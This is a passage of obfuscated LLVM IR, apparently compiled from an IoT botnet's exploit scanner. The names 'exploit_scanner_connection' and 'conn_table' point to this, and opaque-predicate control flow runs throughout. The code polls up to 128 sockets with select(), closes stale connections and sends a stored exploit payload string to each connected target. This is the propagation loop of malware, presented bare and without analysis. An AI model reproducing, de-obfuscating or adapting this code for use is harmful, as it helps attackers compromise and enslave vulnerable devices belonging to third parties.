  %578 = trunc i64 %577 to i32
  store i32 %578, i32* %27, align 4
  br label %579

; <label>:579:                                    ; preds = %570
  store i32 0, i32* %1, align 4
  br label %580

; <label>:580:                                    ; preds = %originalBBpart2159, %579
  %581 = load i32, i32* %1, align 4
  %582 = icmp slt i32 %581, 128
  br i1 %582, label %583, label %769

; <label>:583:                                    ; preds = %580
  store i32 5, i32* %28, align 4
  %584 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %585 = load i32, i32* %1, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %584, i64 %586
  store %struct.exploit_scanner_connection* %587, %struct.exploit_scanner_connection** %7, align 8
  %588 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %589 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %588, i32 0, i32 2
  %590 = load i32, i32* %589, align 8
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %592, label %612

; <label>:592:                                    ; preds = %583
  %593 = load i32, i32* @exploit_fake_time, align 4
  %594 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %595 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %594, i32 0, i32 1
  %596 = load i32, i32* %595, align 4
  %597 = sub i32 %593, %596
  %598 = load i32, i32* %28, align 4
  %599 = icmp ugt i32 %597, %598
  br i1 %599, label %600, label %612

; <label>:600:                                    ; preds = %592
  %601 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %602 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 8
  %604 = call i32 @close(i32 %603)
  %605 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %606 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %605, i32 0, i32 0
  store i32 -1, i32* %606, align 8
  %607 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %608 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %607, i32 0, i32 2
  store i32 0, i32* %608, align 8
  %609 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %610 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %609, i32 0, i32 6
  %611 = getelementptr inbounds [256 x i8], [256 x i8]* %610, i32 0, i32 0
  call void @util_zero(i8* %611, i32 256)
  br label %750

; <label>:612:                                    ; preds = %592, %583
  %613 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %614 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %613, i32 0, i32 2
  %615 = load i32, i32* %614, align 8
  %616 = icmp eq i32 %615, 1
  br i1 %616, label %643, label %617

; <label>:617:                                    ; preds = %612
  %618 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %618, i32 0, i32 2
  %620 = load i32, i32* %619, align 8
  %621 = icmp eq i32 %620, 3
  br i1 %621, label %643, label %622

; <label>:622:                                    ; preds = %617
  %623 = load i32, i32* @x.49
  %624 = load i32, i32* @y.50
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %622
  %631 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %632 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %631, i32 0, i32 2
  %633 = load i32, i32* %632, align 8
  %634 = icmp eq i32 %633, 4
  %635 = load i32, i32* @x.49
  %636 = load i32, i32* @y.50
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %634, label %643, label %717

; <label>:643:                                    ; preds = %originalBBpart2123, %617, %612
  %644 = load i32, i32* @x.49
  %645 = load i32, i32* @y.50
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %643
  %652 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = srem i32 %654, 64
  %656 = zext i32 %655 to i64
  %657 = shl i64 1, %656
  %658 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %659 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %660 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %659, i32 0, i32 0
  %661 = load i32, i32* %660, align 8
  %662 = sdiv i32 %661, 64
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds [16 x i64], [16 x i64]* %658, i64 0, i64 %663
  %665 = load i64, i64* %664, align 8
  %666 = or i64 %665, %657
  store i64 %666, i64* %664, align 8
  %667 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %668 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %667, i32 0, i32 0
  %669 = load i32, i32* %668, align 8
  %670 = load i32, i32* %12, align 4
  %671 = icmp sgt i32 %669, %670
  %672 = load i32, i32* @x.49
  %673 = load i32, i32* @y.50
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart2145, label %originalBB125alteredBB

originalBBpart2145:                               ; preds = %originalBB125
  br i1 %671, label %680, label %700

; <label>:680:                                    ; preds = %originalBBpart2145
  %681 = load i32, i32* @x.49
  %682 = load i32, i32* @y.50
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %680
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 8
  store i32 %691, i32* %12, align 4
  %692 = load i32, i32* @x.49
  %693 = load i32, i32* @y.50
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %700

; <label>:700:                                    ; preds = %originalBBpart2149, %originalBBpart2145
  %701 = load i32, i32* @x.49
  %702 = load i32, i32* @y.50
  %703 = sub i32 %701, 1
  %704 = mul i32 %701, %703
  %705 = urem i32 %704, 2
  %706 = icmp eq i32 %705, 0
  %707 = icmp slt i32 %702, 10
  %708 = or i1 %706, %707
  br i1 %708, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %700
  %709 = load i32, i32* @x.49
  %710 = load i32, i32* @y.50
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %749

; <label>:717:                                    ; preds = %originalBBpart2123
  %718 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %719 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %718, i32 0, i32 2
  %720 = load i32, i32* %719, align 8
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %748

; <label>:722:                                    ; preds = %717
  %723 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %724 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %723, i32 0, i32 0
  %725 = load i32, i32* %724, align 8
  %726 = srem i32 %725, 64
  %727 = zext i32 %726 to i64
  %728 = shl i64 1, %727
  %729 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %730 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %731 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 8
  %733 = sdiv i32 %732, 64
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds [16 x i64], [16 x i64]* %729, i64 0, i64 %734
  %736 = load i64, i64* %735, align 8
  %737 = or i64 %736, %728
  store i64 %737, i64* %735, align 8
  %738 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %739 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %738, i32 0, i32 0
  %740 = load i32, i32* %739, align 8
  %741 = load i32, i32* %11, align 4
  %742 = icmp sgt i32 %740, %741
  br i1 %742, label %743, label %747

; <label>:743:                                    ; preds = %722
  %744 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %745 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %744, i32 0, i32 0
  %746 = load i32, i32* %745, align 8
  store i32 %746, i32* %11, align 4
  br label %747

; <label>:747:                                    ; preds = %743, %722
  br label %748

; <label>:748:                                    ; preds = %747, %717
  br label %749

; <label>:749:                                    ; preds = %748, %originalBBpart2153
  br label %750

; <label>:750:                                    ; preds = %749, %600
  %751 = load i32, i32* @x.49
  %752 = load i32, i32* @y.50
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %750
  %759 = load i32, i32* %1, align 4
  %760 = add nsw i32 %759, 1
  store i32 %760, i32* %1, align 4
  %761 = load i32, i32* @x.49
  %762 = load i32, i32* @y.50
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBBpart2159, label %originalBB155alteredBB

originalBBpart2159:                               ; preds = %originalBB155
  br label %580

; <label>:769:                                    ; preds = %580
  %770 = load i32, i32* @x.49
  %771 = load i32, i32* @y.50
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %769
  %778 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %778, align 8
  %779 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %779, align 8
  %780 = load i32, i32* %12, align 4
  %781 = load i32, i32* %11, align 4
  %782 = icmp sgt i32 %780, %781
  %783 = load i32, i32* @x.49
  %784 = load i32, i32* @y.50
  %785 = sub i32 %783, 1
  %786 = mul i32 %783, %785
  %787 = urem i32 %786, 2
  %788 = icmp eq i32 %787, 0
  %789 = icmp slt i32 %784, 10
  %790 = or i1 %788, %789
  br i1 %790, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br i1 %782, label %791, label %793

; <label>:791:                                    ; preds = %originalBBpart2163
  %792 = load i32, i32* %12, align 4
  br label %811

; <label>:793:                                    ; preds = %originalBBpart2163
  %794 = load i32, i32* @x.49
  %795 = load i32, i32* @y.50
  %796 = sub i32 %794, 1
  %797 = mul i32 %794, %796
  %798 = urem i32 %797, 2
  %799 = icmp eq i32 %798, 0
  %800 = icmp slt i32 %795, 10
  %801 = or i1 %799, %800
  br i1 %801, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %793
  %802 = load i32, i32* %11, align 4
  %803 = load i32, i32* @x.49
  %804 = load i32, i32* @y.50
  %805 = sub i32 %803, 1
  %806 = mul i32 %803, %805
  %807 = urem i32 %806, 2
  %808 = icmp eq i32 %807, 0
  %809 = icmp slt i32 %804, 10
  %810 = or i1 %808, %809
  br i1 %810, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br label %811

; <label>:811:                                    ; preds = %originalBBpart2167, %791
  %812 = phi i32 [ %792, %791 ], [ %802, %originalBBpart2167 ]
  %813 = add nsw i32 1, %812
  %814 = call i32 @select(i32 %813, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %814, i32* %13, align 4
  %815 = call i64 @time(i64* null) #6
  %816 = trunc i64 %815 to i32
  store i32 %816, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %817

; <label>:817:                                    ; preds = %1179, %811
  %818 = load i32, i32* %1, align 4
  %819 = icmp slt i32 %818, 128
  br i1 %819, label %820, label %1182

; <label>:820:                                    ; preds = %817
  %821 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %822 = load i32, i32* %1, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %821, i64 %823
  store %struct.exploit_scanner_connection* %824, %struct.exploit_scanner_connection** %7, align 8
  %825 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %826 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %825, i32 0, i32 0
  %827 = load i32, i32* %826, align 8
  %828 = icmp eq i32 %827, -1
  br i1 %828, label %829, label %830

; <label>:829:                                    ; preds = %820
  br label %1179

; <label>:830:                                    ; preds = %820
  %831 = load i32, i32* @x.49
  %832 = load i32, i32* @y.50
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %830
  %839 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %840 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %841 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 8
  %843 = sdiv i32 %842, 64
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [16 x i64], [16 x i64]* %839, i64 0, i64 %844
  %846 = load i64, i64* %845, align 8
  %847 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %848 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %847, i32 0, i32 0
  %849 = load i32, i32* %848, align 8
  %850 = srem i32 %849, 64
  %851 = zext i32 %850 to i64
  %852 = shl i64 1, %851
  %853 = and i64 %846, %852
  %854 = icmp ne i64 %853, 0
  %855 = load i32, i32* @x.49
  %856 = load i32, i32* @y.50
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBBpart2196, label %originalBB169alteredBB

originalBBpart2196:                               ; preds = %originalBB169
  br i1 %854, label %863, label %965

; <label>:863:                                    ; preds = %originalBBpart2196
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %864 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %865 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %864, i32 0, i32 0
  %866 = load i32, i32* %865, align 8
  %867 = bitcast i32* %29 to i8*
  %868 = call i32 @getsockopt(i32 %866, i32 1, i32 4, i8* %867, i32* %31) #6
  store i32 %868, i32* %30, align 4
  %869 = load i32, i32* %29, align 4
  %870 = icmp eq i32 %869, 0
  br i1 %870, label %871, label %955

; <label>:871:                                    ; preds = %863
  %872 = load i32, i32* %30, align 4
  %873 = icmp eq i32 %872, 0
  br i1 %873, label %874, label %955

; <label>:874:                                    ; preds = %871
  %875 = load i32, i32* @x.49
  %876 = load i32, i32* @y.50
  %877 = sub i32 %875, 1
  %878 = mul i32 %875, %877
  %879 = urem i32 %878, 2
  %880 = icmp eq i32 %879, 0
  %881 = icmp slt i32 %876, 10
  %882 = or i1 %880, %881
  br i1 %882, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %874
  %883 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %884 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %883, i32 0, i32 2
  %885 = load i32, i32* %884, align 8
  %886 = icmp eq i32 %885, 3
  %887 = load i32, i32* @x.49
  %888 = load i32, i32* @y.50
  %889 = sub i32 %887, 1
  %890 = mul i32 %887, %889
  %891 = urem i32 %890, 2
  %892 = icmp eq i32 %891, 0
  %893 = icmp slt i32 %888, 10
  %894 = or i1 %892, %893
  br i1 %894, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %886, label %895, label %920

; <label>:895:                                    ; preds = %originalBBpart2200
  %896 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %897 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %896, i32 0, i32 8
  %898 = getelementptr inbounds [2560 x i8], [2560 x i8]* %897, i32 0, i32 0
  %899 = call i32 @util_strcpy(i8* %898, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i32 0, i32 0))
  %900 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %901 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %900, i32 0, i32 0
  %902 = load i32, i32* %901, align 8
  %903 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %904 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %903, i32 0, i32 8
  %905 = getelementptr inbounds [2560 x i8], [2560 x i8]* %904, i32 0, i32 0
  %906 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %907 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %906, i32 0, i32 8
  %908 = getelementptr inbounds [2560 x i8], [2560 x i8]* %907, i32 0, i32 0
  %909 = call i32 @util_strlen(i8* %908)
  %910 = sext i32 %909 to i64
  %911 = call i64 @send(i32 %902, i8* %905, i64 %910, i32 16384)
  %912 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %913 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %912, i32 0, i32 8
  %914 = getelementptr inbounds [2560 x i8], [2560 x i8]* %913, i32 0, i32 0
  call void @util_zero(i8* %914, i32 2560)
  %915 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %916 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %915, i32 0, i32 6
  %917 = getelementptr inbounds [256 x i8], [256 x i8]* %916, i32 0, i32 0
  call void @util_zero(i8* %917, i32 256)
  %918 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %919 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %918, i32 0, i32 2
  store i32 4, i32* %919, align 8
  br label %1179

; <label>:920:                                    ; preds = %originalBBpart2200
  %921 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %922 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %921, i32 0, i32 2
  %923 = load i32, i32* %922, align 8
  %924 = icmp eq i32 %923, 4
  br i1 %924, label %925, label %934

; <label>:925:                                    ; preds = %920
  %926 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %927 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %926, i32 0, i32 0
  %928 = load i32, i32* %927, align 8
  %929 = call i32 @close(i32 %928)
  %930 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %931 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %930, i32 0, i32 0
  store i32 -1, i32* %931, align 8
  %932 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %933 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %932, i32 0, i32 2
  store i32 0, i32* %933, align 8
  br label %1179

; <label>:934:                                    ; preds = %920
  %935 = load i32, i32* @x.49
  %936 = load i32, i32* @y.50
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %934
  %943 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %944 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %943, i32 0, i32 2
  store i32 3, i32* %944, align 8
  %945 = load i32, i32* @x.49
  %946 = load i32, i32* @y.50
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %953

; <label>:953:                                    ; preds = %originalBBpart2204
  br label %954

; <label>:954:                                    ; preds = %953
  br label %964

; <label>:955:                                    ; preds = %871, %863
  %956 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %957 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %956, i32 0, i32 0
  %958 = load i32, i32* %957, align 8
  %959 = call i32 @close(i32 %958)
  %960 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %961 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %960, i32 0, i32 0
  store i32 -1, i32* %961, align 8
  %962 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %963 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %962, i32 0, i32 2
  store i32 0, i32* %963, align 8
  br label %1179

; <label>:964:                                    ; preds = %954
  br label %965

; <label>:965:                                    ; preds = %964, %originalBBpart2196
  %966 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %967 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %968 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %967, i32 0, i32 0
  %969 = load i32, i32* %968, align 8
  %970 = sdiv i32 %969, 64
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds [16 x i64], [16 x i64]* %966, i64 0, i64 %971
  %973 = load i64, i64* %972, align 8
  %974 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %975 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %974, i32 0, i32 0
  %976 = load i32, i32* %975, align 8
  %977 = srem i32 %976, 64
  %978 = zext i32 %977 to i64
  %979 = shl i64 1, %978
  %980 = and i64 %973, %979
  %981 = icmp ne i64 %980, 0
  br i1 %981, label %982, label %1162

; <label>:982:                                    ; preds = %965
  br label %983

; <label>:983:                                    ; preds = %originalBBpart2253, %originalBBpart2245, %982
  store i32 0, i32* %32, align 4
  %984 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %985 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %984, i32 0, i32 2
  %986 = load i32, i32* %985, align 8
  %987 = icmp eq i32 %986, 0
  br i1 %987, label %988, label %989

; <label>:988:                                    ; preds = %983
  br label %1161

; <label>:989:                                    ; preds = %983
  %990 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %991 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %990, i32 0, i32 5
  %992 = load i32, i32* %991, align 4
  %993 = icmp eq i32 %992, 256
  br i1 %993, label %994, label %1022

; <label>:994:                                    ; preds = %989
  %995 = load i32, i32* @x.49
  %996 = load i32, i32* @y.50
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %994
  %1003 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1004 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1003, i32 0, i32 6
  %1005 = getelementptr inbounds [256 x i8], [256 x i8]* %1004, i32 0, i32 0
  %1006 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1007 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1006, i32 0, i32 6
  %1008 = getelementptr inbounds [256 x i8], [256 x i8]* %1007, i32 0, i32 0
  %1009 = getelementptr inbounds i8, i8* %1008, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1005, i8* %1009, i64 192, i32 1, i1 false)
  %1010 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1011 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1010, i32 0, i32 5
  %1012 = load i32, i32* %1011, align 4
  %1013 = sub nsw i32 %1012, 64
  store i32 %1013, i32* %1011, align 4
  %1014 = load i32, i32* @x.49
  %1015 = load i32, i32* @y.50
  %1016 = sub i32 %1014, 1
  %1017 = mul i32 %1014, %1016
  %1018 = urem i32 %1017, 2
  %1019 = icmp eq i32 %1018, 0
  %1020 = icmp slt i32 %1015, 10
  %1021 = or i1 %1019, %1020
  br i1 %1021, label %originalBBpart2218, label %originalBB206alteredBB

originalBBpart2218:                               ; preds = %originalBB206
  br label %1022

; <label>:1022:                                   ; preds = %originalBBpart2218, %989
  %1023 = load i32, i32* @x.49
  %1024 = load i32, i32* @y.50
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBB220, label %originalBB220alteredBB

originalBB220:                                    ; preds = %originalBB220alteredBB, %1022
  %1031 = call i32* @__errno_location() #9
  store i32 0, i32* %1031, align 4
  %1032 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1033 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1032, i32 0, i32 0
  %1034 = load i32, i32* %1033, align 8
  %1035 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1036 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1035, i32 0, i32 6
  %1037 = getelementptr inbounds [256 x i8], [256 x i8]* %1036, i32 0, i32 0
  %1038 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1039 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1038, i32 0, i32 5
  %1040 = load i32, i32* %1039, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds i8, i8* %1037, i64 %1041
  %1043 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1044 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1043, i32 0, i32 5
  %1045 = load i32, i32* %1044, align 4
